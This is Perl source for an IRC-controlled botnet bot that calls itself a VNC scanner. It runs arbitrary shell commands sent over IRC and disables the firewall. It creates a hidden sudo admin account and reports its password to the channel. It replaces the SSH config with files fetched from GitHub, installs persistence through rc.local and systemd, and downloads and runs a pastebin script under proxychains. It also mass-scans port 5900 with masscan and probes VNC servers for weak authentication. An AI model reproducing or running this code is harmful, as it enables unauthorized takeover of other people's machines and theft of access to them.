use strict;
use warnings;
use Mojo::IRC;
use Net::Address::IP::Local;
use Time::HiRes;
use feature 'say';
use Fcntl qw(:flock SEEK_END);
my $filename = 'CCFinder.log';
$|=1;
#defineportshere
use Mojo::IOLoop;
#definetimeouthere
#defineforkshere
#definenoticechanhere
#definechanhere
my %events;
my $range;
my $minimum;
my $random_number;
my $random_user;
my @arr4y;
my $address;
my $irc = Mojo::IRC->new(
 #definenickhere
 user => 'VNCScan',
 #defineserverhere
 );
#definesslhere
$irc->on(
  close => sub {
    $events{close}++;
    $irc->connect(sub { });
  }
);
$irc->on(irc_rpl_welcome => sub {
 my($irc, $err) = @_;
 warn 'Joined IRC server.';
 $irc->write(join => $channel);
 });
$irc->on(irc_join => sub {
 
 });
my $misc = {};
$irc->on(irc_privmsg => sub {
 my($irc, $message) = @_;
 my $msg = $message->{params}[1];
 if ($msg =~ /@.version/) {
  warn 'Version request.';
  $irc->write(notice => $noticechan => "9,1Perl VNC bot [FINAL] by independent: 12https://github.com/independentcod");
 }
 if ($msg =~ /@.autorun/) {
  system("if [ ! -f ./rc.local ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;");
  system("chown $USER /etc/rc.local && chmod 755 /etc/rc.local && touch /etc/systemd/system/rc-local.service;");
  system("if [ ! -f ./rc-local.service ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;");
  system("systemctl enable rc-local;");
  $irc->write(notice => $noticechan => "[info] Autorun enabled\n");
 }
 if ($msg =~ /@.cloak/) {
  system("curl -LvO https://pastebin.com/raw/w86vVZ7i -o ~/perlircssl.pl");
  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/proxych/main/install.sh -o install.sh && sh install.sh;");
  system("proxychains perl ~/perlircssl.pl&");
  $irc->write(notice => $noticechan => "[info] Cloaked!\n");
 }
 if ($msg =~ /sudo/) {
             my $fragment =  substr $msg, 7;
             $irc->write(notice => $noticechan => "$msg\n");
             system("$msg");
             my @output = `$msg 2>&1 3>&1`;
             foreach(@output) {
               $irc->write(notice => $noticechan => "$_\r\n");         
             }
 }
  if ($msg =~ /@.getssh/) {
  warn 'Flushing iptables & Accepting all remote connections.';
system "sudo iptables -F INPUT";
system "sudo iptables -P INPUT ACCEPT";
  warn 'Adding new admin account...';
$range = 999999999;
$minimum = 100000000;
$random_number = int(rand($range)) + $minimum;
$random_user = sprintf("%08X", rand(0xFFFFFFFF));
system 'sudo useradd -m ' . $random_user;
system "echo $random_user:$random_number | sudo chpasswd";
system 'if [ -f "/usr/bin/yum" ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
system 'if [ -f "/usr/bin/apt" ]; then sudo adduser ' . $random_user . ' sudo; fi';
  warn 'Configuring SSH...';
system 'wget -O /etc/ssh/sshd_config https://github.com/ind3p3nd3nt/vncperlbot/raw/master/sshd_config';
system 'wget -O /etc/ssh/sshd_banner https://github.com/ind3p3nd3nt/vncperlbot/raw/master/sshd_banner';
system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
  warn 'Getting External IP Address';
  $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
  @arr4y = ('9,1Added admin:', $random_user, 'password:', $random_number, 'on host:', $address);
  warn "@arr4y";
  $irc->write(notice => $noticechan => @arr4y);
 }
 elsif ($msg =~ /@.stopexploit/) {
  warn 'stopexploit called, killing...';
  if ( exists $misc->{exploitpid} )  {
   $irc->write(notice => $noticechan => '[Info] Sending SIGTERM to PID ' . $misc->{exploitpid});
   kill 'INT', $misc->{exploitpid};kill 'TERM', $misc->{exploitpid};
   delete $misc->{exploitpid};
   $irc->write(notice => $noticechan => '[Info] PID ' . $misc->{exploitpid} . " killed, !exploit stopped");
   } else {
    $irc->write(notice => $noticechan => "exploit is not running");
   }
  }
  return unless $msg =~ /^\@./;
  my $subprocess = Mojo::IOLoop->subprocess(
   sub {
    my $s = shift;
    my @IRC_RESULTS;
    $events{connect}++;
    if ($msg =~ /@.scan ([^\s]+)/) {
     $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
     my $range = $1;
     my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
     warn "Received rangescan request on $range , running masscan...";
     my $r = `$masscancmd`;
     push @IRC_RESULTS, $_ foreach split "\n", $r;
     } elsif ($msg =~ /@.exploit/) {
      warn 'Received exploitrun request, exploiting hosts.txt...';
      my $r = exploitrun ("vnc", $s, $s->pid);

      } elsif ($msg =~ /@.format/) {
       warn 'Received file formatting request, processing...';    
       my $formatcmd = "rm -rf ips.txt && cat hosts.txt | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >>ips.txt";
       my $r = `$formatcmd`;
       push @IRC_RESULTS, $_ foreach split "\n", $r;
      }
      return @IRC_RESULTS;
      }, sub {
       my ($s, $error, @res) = @_;
       $irc->write(notice => $noticechan => " FINISHED: $msg");
       warn "Finished work: $msg";
       if ( $error ) {
        warn "ERROR FOUND: $error";
        $irc->write(notice => $noticechan => "ERROR: " . $error);
        return;
       }
       $irc->write(notice => $noticechan => $_) foreach @res;
       });

  $subprocess->on(progress => sub {
   my ($subprocess, @data) = @_;
   $irc->write(notice => $noticechan => $_) foreach @data; # this prints the data from subprocesses
   });
  $subprocess->on(spawn => sub {
   my $subprocess = shift;
   my $pid = $subprocess->pid;
   # $irc->write(notice => $noticechan =>  "Performing work in process $pid");
   if ( $msg =~ /@.exploit/ ) {
    $irc->write(notice => $noticechan => 'pid: ' . $pid) ;
    $misc->{exploitpid} = $pid ;
   }
   });
  });
   $irc->connect(sub {
    my($irc, $err) = @_;
    return warn $err if $err;
    $irc->write(join => $channel);
    });
   Mojo::IOLoop->start;

   sub exploitvnc {
    my $row = shift;
    my $subp = shift;
    my $ownpid = shift;
    my $arg = shift;
    foreach my $vncport (@VNC_PORTS){
     my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $vncport, Proto => 'tcp', Timeout => 10);
     next unless $sock;
     $sock->read(my $proto_ver, 12);
     eval { 
      print $sock $proto_ver;
      $sock->read(my $sec_types, 1);
      $sock->read(my $ignored, unpack('C', $sec_types));
      print $sock "\x01";
      $sock->read(my $auth_type, 4);
      print $sock "\x01"; 
     };
     my $ver = "RFB 003.008";
     $sock->read(my $vnc_data, 4);
     if (unpack('I', $vnc_data)) {
      if ($proto_ver =~ $ver) {
       $proto_ver =~ s/[\r\n]+//g;
       if (index($vnc_data, chr(4)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
       elsif (index($vnc_data, chr(195)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
       elsif (index($vnc_data, chr(208)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
       elsif (index($vnc_data, chr(88)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
       elsif (index($vnc_data, chr(87)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
       elsif (index($vnc_data, chr(7)) != -1) {

        $subp->progress(" $row:$vncport $vnc_data ");
       }
      }
     }
    }
    exit; 
   }

   sub exploitrun {
    my $arg = shift;
    my $subp = shift;
    my $ownpid = shift;
    $SIG{CHLD} = 'IGNORE';
    $subp->progress("[Info] Starting $arg Exploiter ");
    my @ips;
    my %ips;
    my $filename = 'ips.txt';
    if (open(my $fh, '<:encoding(UTF-8)', $filename)) {
     while (my $row = <$fh>) {
      chomp $row;
      $row = $1 if $row =~ /(\d+\.\d+\.\d+\.\d+)/;
      #push @ips, $row;
      $ips{$row} = '';
     }
     close $fh;
    }
    push @ips, $_ foreach (sort {$a cmp $b} keys %ips);
    my %pids;
    $subp->progress("Calling IPs (" . int (scalar @ips) . ")");

    my $finished = 0;
    my $i = 0;
    while ( @ips > 0 )
    {
     Time::HiRes::sleep(0.1);
     #$subp->progress("[Info] In progress");
     foreach (keys %pids){
      my $exists = kill 0, $_; # kill 'TERM', $_ 
      if ( $exists ) {
       kill 'TERM', $_ if $pids{$_} < CORE::time;
       } else {
        delete $pids{$_}
       }
      }
      if ( scalar keys %pids >= $maxforks )
      {
       say int scalar @ips;
       say 'pids: ' . scalar keys %pids;
       } else {
        my $targetip = shift @ips;
        say 'Sending ' . $targetip;
        my $pid;
        if ($pid = fork) {
         say $pid;
         } else {
          if ($arg =~ /rdp/) {
           exploitrdp($targetip, $subp, $ownpid);
          }
          if ($arg =~ /ssh/) {
           exploitssh($targetip, $subp, $ownpid);
          }
          if ($arg =~ /mysql/) {
           exploitmysql($targetip, $subp, $ownpid);
          }
          if ($arg =~ /smtp/) {
           exploitsmtp($targetip, $subp, $ownpid);
          }
          if ($arg =~ /vnc/) {
           exploitvnc($targetip, $subp, $ownpid);
          }
         }
         $pids{$pid} = CORE::time + $forktimeout;
        }
       }
       $subp->progress("Done Calling IPs");
       while ( scalar keys %pids > 0 ) # wait for last alive forks to terminate
       {
        Time::HiRes::sleep(0.1);
        foreach (keys %pids){
         my $exists = kill 0, $_; # kill 'TERM', $_ 
         if ( $exists ) {

          kill 'TERM', $_ if $pids{$_} < CORE::time;
          } else {
           delete $pids{$_}
          }
         }
        }
        $subp->progress("[Info] $arg Done Scan");
       }
       sub lockf {
        my ($fh) = @_;
        flock($fh, LOCK_EX) or die "Cannot lock - $!\n";
       }
       sub unlock {
        my ($fh) = @_;
        flock($fh, LOCK_UN) or die "Cannot unlock - $!\n";
       }
